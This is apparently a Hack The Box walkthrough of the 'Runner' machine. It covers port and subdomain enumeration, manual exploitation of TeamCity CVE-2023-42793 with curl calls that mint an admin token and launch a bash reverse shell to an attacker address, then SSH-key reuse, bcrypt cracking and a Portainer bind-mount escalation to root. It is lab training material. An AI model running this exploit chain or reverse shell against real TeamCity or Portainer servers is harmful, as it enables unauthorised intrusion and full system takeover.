# HTB - Runner
### TL;DR
This is an Ubuntu 22.04 machine hosting a vulnerable version of TeamCity (CVE-2023-42793) which can be exploited to get a foothold into the system. Then, we locate private keys and usernames stored in the file system and move laterally to users with privileges to read the user flag. Regarding privilege escalation, a Portainer application running as root is abused.
### KEYWORDS
TeamCity, CVE-2023-42793, port forwarding, Portainer.
### REFERENCES
https://www.jetbrains.com/teamcity/<br>
https://www.cvedetails.com/cve/CVE-2023-42793/<br>
https://www.prio-n.com/blog/cve-2023-42793-attacking-defending-JetBrains-TeamCity<br>
https://github.com/hotplugin0x01/CVE-2023-42793<br>
<br>
### ENUMERATION
Port scan.
```markdown
> nmap $target -p- --min-rate=5000 -Pn --open --reason
Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-20 15:31 EDT
Nmap scan report for 10.10.11.13
Host is up, received user-set (0.078s latency).
Not shown: 64465 closed tcp ports (conn-refused), 1067 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack
80/tcp   open  http     syn-ack
8000/tcp open  http-alt syn-ack

Nmap done: 1 IP address (1 host up) scanned in 14.57 seconds
```
Enumerate the open ports.
```markdown
> nmap $target -p22,80,8000 -sV -sC -Pn -vv -n       
Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-20 15:31 EDT
Nmap scan report for 10.10.11.13
Host is up, received user-set (0.072s latency).
Scanned at 2024-04-20 15:31:57 EDT for 12s

PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp   open  http        syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://runner.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
8000/tcp open  nagios-nsca syn-ack Nagios NSCA
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 12.86 seconds

```
Fuzz for subdomains.
```markdown
> ffuf -c -w /usr/share/seclists/Discovery/DNS/namelist.txt -fc 302,404 -t 100 -u http://runner.htb -H "Host: FUZZ.runner.htb" 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://runner.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.runner.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302,404
________________________________________________

teamcity                [Status: 401, Size: 66, Words: 8, Lines: 2, Duration: 86ms]
:: Progress: [151265/151265] :: Job [1/1] :: 163 req/sec :: Duration: [0:02:56] :: Errors: 0 ::
```
Add to hosts file and enumerate with Firefox. 

![Untitled](https://github.com/user-attachments/assets/3cf62611-f21f-42d3-85d8-561046abe661)

A Teamcity v.2023.05.03 portal comes into view. This is a package delivery tool for developers (https://www.jetbrains.com/teamcity/).

### USER
Looking for Teamcity vulnerabilities, I came across this one: https://www.cvedetails.com/cve/CVE-2023-42793/<br>
<br>
Also, I found this interesting site: https://www.prio-n.com/blog/cve-2023-42793-attacking-defending-JetBrains-TeamCity<br>
<br>
There are several POC's in Github but couldn't make any of them work, so I decided to exploit the application manually. This was also used as a reference: https://github.com/hotplugin0x01/CVE-2023-42793<br>
<br>
First, delete any previous authentication token querying this endpoint `/app/rest/users/<userLocator>/tokens/RPC2`
```markdown
> curl –X DELETE "http://teamcity.runner.htb/app/rest/users/id:1/tokens/RPC2"
```
And create a token for yourself.
```markdown
> curl -X POST "http://teamcity.runner.htb/app/rest/users/id:1/tokens/RPC2"
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><token name="RPC2" creationTime="2024-04-21T17:25:01.502Z" value="eyJ0eXAiOiAiVENWMiJ9.MlF2QndBSlJYSXdQSUJYY2VxZWN4QTBCLWdR.NGQ2OTY2ZmUtOWY4Yi00MWFhLThkYTgtOTY3OTAyY2E1N2E2"/>
```
Next step is to configure the debug API to enable admins to trigger configuration reloads, thus enabling arbitrary RCE. For this, use the previously obtained token.
```markdown
> curl –X POST "http://teamcity.runner.htb//admin/dataDir.html?action=edit&fileName=config/internal.properties&content=rest.debug.processes.enable=true" -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.MlF2QndBSlJYSXdQSUJYY2VxZWN4QTBCLWdR.NGQ2OTY2ZmUtOWY4Yi00MWFhLThkYTgtOTY3OTAyY2E1N2E2" -H "Content-Type: text/plain"
```
Now you can issue commands. Insert the binary name in the `exePath` parameter, and the rest of arguments in as many `params` fields as you need. The following line contains the payload `/bin/bash –c bash -i >& /dev/tcp/10.10.xxx.xxx/1919 0>&1`
```markdown
> curl –X POST "http://teamcity.runner.htb/app/rest/debug/processes?exePath=/bin/bash&params=-c&params=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.xxx.xxx%2F1919%200%3E%261" -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.MlF2QndBSlJYSXdQSUJYY2VxZWN4QTBCLWdR.NGQ2OTY2ZmUtOWY4Yi00MWFhLThkYTgtOTY3OTAyY2E1N2E2" -H "Content-Type: text/plain"
<html>
<head><title>504 Gateway Time-out</title></head>
<body>
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
```
A reverse shell for user `tcuser` is received on port 1919.

![Untitled3](https://github.com/user-attachments/assets/085a0079-25de-4f35-80d0-520f1a079279)

At a first glance, this looks like a container, let's have a look at the `env` variables to verify this.
```markdown
> env
TEAMCITY_LOGS_PATH=/opt/teamcity/bin/../logs
HOSTNAME=647a82f29ca0
LANGUAGE=en_US:en
JAVA_HOME=/opt/java/openjdk
*TEAMCITY_ENV=container*
PWD=/
TEAMCITY_LOGS=/opt/teamcity/logs
TEAMCITY_RESTART_LOCK_FILE_PATH=/opt/teamcity/bin/../logs/teamcity.lock
CATALINA_OPTS= -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 -server -Xmx2g -XX:ReservedCodeCacheSize=640m -Dteamcity.configuration.path="../conf/teamcity-startup.properties" -Dlog4j2.configurationFile="file:/opt/teamcity/bin/../conf/teamcity-server-log4j.xml" -Dteamcity_logs="/opt/teamcity/bin/../logs" -Djava.awt.headless=true
TEAMCITY_SERVER_MEM_OPTS=-Xmx2g -XX:ReservedCodeCacheSize=640m
TEAMCITY_DATA_PATH=/data/teamcity_server/datadir
HOME=/opt/teamcity
LANG=C.UTF-8
CATALINA_PID=/opt/teamcity/bin/../logs/teamcity.pid
TEAMCITY_SERVER_OPTS=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005
TEAMCITY_BIN_DIRECTORY=/opt/teamcity/bin
TEAMCITY_SERVER_SCRIPT=/opt/teamcity/bin/teamcity-server.sh
SHLVL=2
JDK_JAVA_OPTIONS= --add-opens jdk.management/com.sun.management.internal=ALL-UNNAMED -XX:+IgnoreUnrecognizedVMOptions --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED --add-opens=java.base/java.util.concurrent=ALL-UNNAMED --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED
TEAMCITY_DIST=/opt/teamcity
CATALINA_TMPDIR=/opt/teamcity/temp
LC_ALL=en_US.UTF-8
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
OLDPWD=/opt/teamcity/conf
```

Looking for private keys in the file system, I found this one.
```markdown
> find / -name id_rsa 2> /dev/null
/data/teamcity_server/datadir/config/projects/AllProjects/pluginData/ssh_keys/id_rsa

> cat /data/teamcity_server/datadir/config/projects/AllProjects/pluginData/ssh_keys/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAlk2rRhm7T2dg2z3+Y6ioSOVszvNlA4wRS4ty8qrGMSCpnZyEISPl
htHGpTu0oGI11FTun7HzQj7Ore7YMC+SsMIlS78MGU2ogb0Tp2bOY5RN1/X9MiK/SE4liT
njhPU1FqBIexmXKlgS/jv57WUtc5CsgTUGYkpaX6cT2geiNqHLnB5QD+ZKJWBflF6P9rTt
zkEdcWYKtDp0Phcu1FUVeQJOpb13w/L0GGiya2RkZgrIwXR6l3YCX+mBRFfhRFHLmd/lgy
...
axTWDMGzuA9dg6YZoUrzLWcSU8cBd+iMvulqkyaGud83H3C17DWLKAztz7pGhT8mrWy5Ox
KzxjsB7irPtZxWmBUcFHbCrOekiR56G2MUCqQkYfn6sJ2v0/Rp6PZHNScdXTMDEl10qtAW
QHkfhxGO8gimrAvjruuarpItDzr4QcADDQ5HTU8PSe/J2KL3PY7i4zWw9+/CyPd0t9yB5M
KgK8c9z2ecgZsAAAALam9obkBydW5uZXI=
-----END OPENSSH PRIVATE KEY-----

```
Nice to know but useless since we don't have an username, need to look further. Found several database backups here `/data/teamcity_server/datadir/backup`
```markdown
> ls -hal
total 860K
drwxr-x--- 2 tcuser tcuser 4.0K Apr 21 16:43 .
drwxr-xr-x 7 tcuser tcuser 4.0K Apr 21 16:02 ..
-rw-r----- 1 tcuser tcuser 265K Apr 21 14:53 TeamCity_Backup_20240421_145357.zip
-rw-r----- 1 tcuser tcuser 289K Apr 21 16:35 TeamCity_Backup_20240421_163536.zip
-rw-r----- 1 tcuser tcuser 289K Apr 21 16:43 TeamCity_Backup_20240421_164327.zip
```
And inside `TeamCity_Backup_20240421_145357.zip`, in the `database_dump` folder, a dump for the `users` table which contains hashes for users `john@runner.htb` and `matthew@runner.htb`

![Untitled4](https://github.com/user-attachments/assets/66b6be9a-dcec-4eb2-a81e-99df26d9f6ee)

John's seems uncrackable in my rig, though the other one (Matthew's) is (blowfish module).
```markdown
> hashcat -m 3200 -a 0 -d 1 hash.txt .\rockyou.txt
```

Take note of this password, we will use it afterwards. Now that we have 2 usernames, we can test the private key we found before. It works with username `john` and we are supplied with an SSH shell in the host.

![Untitled2](https://github.com/user-attachments/assets/30898946-034a-482a-b1dd-913bcb4ed0fd)

Which can be used to retrieve the user flag.

### ROOT
Start from the SSH shell under user `john` and take the opportunity to enumerate the current user and the system.
```markdown
> id && whoami
uid=1001(john) gid=1001(john) groups=1001(john)

> uname -a && cat /etc/os-release
Linux runner 5.15.0-102-generic #112-Ubuntu SMP Tue Mar 5 16:50:32 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
PRETTY_NAME="Ubuntu 22.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.4 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```
There is something listening on port 9000.
```markdown
> netstat -lnput
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:5005          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9443          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8111          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::8000                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```
Forward to kali and enumerate with Firefox.
```markdown
> ssh -i id_rsa -L 9000:127.0.0.1:9000 john@runner.htb
```

A Portainer portal comes into view, here we can enter the Matthew's credential that we cracked before.

![Untitled5](https://github.com/user-attachments/assets/ac33705c-7657-42fe-b206-2300ed0a9558)

Next step is to generate a volume with the following parameters.

![Untitled9](https://github.com/user-attachments/assets/46adb3de-65b6-4acf-8642-89d016cc1b43)

|Name|Value|
|---|---|
|device|/|
|o|bind|
|type|none|

Then create a container with image.
```markdown
sha256:ca2b0f26964cf2e80ba3e084d5983dab293fdb87485dc6445f3f7bbfc89d7459
```

![Untitled8](https://github.com/user-attachments/assets/f8502dee-cdd0-479f-8652-f53488374fc4)

Using the previous volume.

![Untitled7](https://github.com/user-attachments/assets/03dff231-ae52-4bfa-b4a2-401b4e61b555)

Don't forget to select the option `Interactive & TTY (-i -t)`<br>
<br>
Once the container is started, execute command `/bin/bash` as user root in the console.

![untitles10](https://github.com/user-attachments/assets/2ec0c010-0f50-47ff-b58c-6ab2fb78ee3e)

You are root.

![Untitled6](https://github.com/user-attachments/assets/d6df3621-531b-4afd-b093-cb74a4ff0b72)

